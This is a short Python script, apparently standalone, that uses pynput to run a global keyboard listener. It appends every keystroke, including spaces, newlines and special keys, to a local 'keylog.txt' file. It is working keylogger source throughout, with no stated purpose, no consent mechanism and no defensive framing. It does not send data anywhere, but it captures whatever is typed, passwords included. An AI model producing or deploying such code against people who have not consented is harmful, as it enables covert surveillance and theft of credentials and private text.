from pynput.keyboard import Key, Listener


log_file = "keylog.txt"

def capture(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")

    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key}]")


with Listener(on_press=capture) as listener:
    listener.join()